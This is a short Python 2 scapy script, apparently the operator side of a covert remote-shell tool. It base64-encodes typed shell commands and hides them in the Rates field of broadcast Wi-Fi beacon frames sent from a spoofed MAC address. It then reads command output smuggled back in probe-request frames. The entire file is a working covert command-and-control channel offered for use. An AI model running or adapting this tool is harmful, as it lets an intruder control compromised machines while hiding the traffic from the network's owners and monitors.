#!/usr/bin/python
# Based on smuggler project by Tom Neaves

# Library imports 
import sys,logging,base64,readline
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

# Variable Definition
verbosity=0
mackey="00:01:02:03:04:05"
cmd = ""
try:
        interface=sys.argv[1]
except:
        print "Usage: python server.py mon_interface"
        quit()

# Define history log
try:
	histfile = os.path.join(".chat_history")
	readline.read_history_file(histfile)
except:
	pass
readline.set_history_length(1000)

# Packet Handler function (called by sniff; argument:packet)
def PacketHandler(pkt):
	if pkt.haslayer(Dot11):
		if pkt.type == 0 and pkt.subtype == 4 and pkt.addr2 == mackey: # Probe Request frame
			output = ''
			elt = pkt[Dot11Elt]
			if verbosity > 1: pkt.show()
			while isinstance(elt, Dot11Elt):
				if elt.ID == 0:
					output = output + elt.info
				elif elt.ID == 1:
					output = output + elt.info
				elif elt.ID == 2:
					output = output + elt.info
				elif elt.ID == 3:
					output = output + elt.info
				elif elt.ID == 4:
					output = output + elt.info
				elif elt.ID == 5:
					output = output + elt.info
				elif elt.ID == 6:
					output = output + elt.info
				elif elt.ID == 7:
					output = output + elt.info
				elt = elt.payload
			if verbosity > 1: print output
			print base64.b64decode(output),
			return True

# Frame sending function (called by main, argument:shell output)
def SendFrame(payload):
	frame = RadioTap()
	frame /= Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=mackey,addr3=RandMAC())
	frame /= Dot11Beacon(cap="ESS")
	frame /= Dot11Elt(ID="SSID",info='')
	frame /= Dot11Elt(ID="Rates",info=payload)
	# frame /= Dot11Elt(ID="DSset",info="\x03")
	# frame /= Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
	if verbosity > 1: frame.show()
	if verbosity > 2: wrpcap('./client_beacon.cap',frame)

	sendp(frame, verbose=verbosity, count=10)
	sniff(iface=interface, stop_filter=PacketHandler)

# Main section
while cmd != "exit":
	print "\nshell>",
	cmd = raw_input()
	if cmd != "exit" and cmd != '':
		readline.write_history_file(histfile)
		SendFrame(base64.b64encode(cmd))

print "\nBye!\n"

